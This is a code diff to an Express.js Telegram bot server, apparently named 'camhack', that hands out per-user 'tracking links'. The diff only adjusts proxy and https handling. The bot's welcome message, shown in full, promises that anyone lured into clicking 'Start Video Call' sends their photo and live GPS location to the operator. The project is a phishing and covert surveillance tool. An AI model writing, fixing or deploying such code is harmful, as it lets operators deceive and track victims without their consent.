@@ -2,6 +2,7 @@ import express from 'express';
 import path from 'path';
 
 const app = express();
+app.set('trust proxy', true);
 const PORT = process.env.PORT || 3000;
 
 app.use(express.json({ limit: '15mb' }));
@@ -103,7 +104,10 @@ app.post('/api/webhook', async (req, res) => {
 
       if (text.startsWith('/start')) {
         const host = req.get('host') || 'camhack.vercel.app';
-        const protocol = req.protocol || 'https';
+        let protocol = req.protocol || 'https';
+        if (host && host.includes('vercel.app')) {
+          protocol = 'https';
+        }
         const customLink = `${protocol}://${host}/?ref=${chatId}`;
 
         const welcomeMessage = `👋 Hello ${firstName}!\n\n✨ Welcome to Urgent Video Chat Bot.\n\n🔗 **Your Custom Tracking Link:**\n${customLink}\n\n📤 Share this link with anyone. When they open it and click "Start Video Call" (allowing camera & location), you will instantly receive their photo and live GPS location right here in this chat! 📸📍`;
@@ -132,7 +136,10 @@ app.get('/api/set-webhook', async (req, res) => {
   try {
     const botToken = process.env.TELEGRAM_BOT_TOKEN || DEFAULT_BOT_TOKEN;
     const host = req.get('host');
-    const protocol = req.protocol || 'https';
+    let protocol = req.protocol || 'https';
+    if (host && host.includes('vercel.app')) {
+      protocol = 'https';
+    }
     const webhookUrl = `${protocol}://${host}/api/webhook`;
 
     const response = await fetch(`https://api.telegram.org/bot${botToken}/setWebhook?url=${encodeURIComponent(webhookUrl)}`);
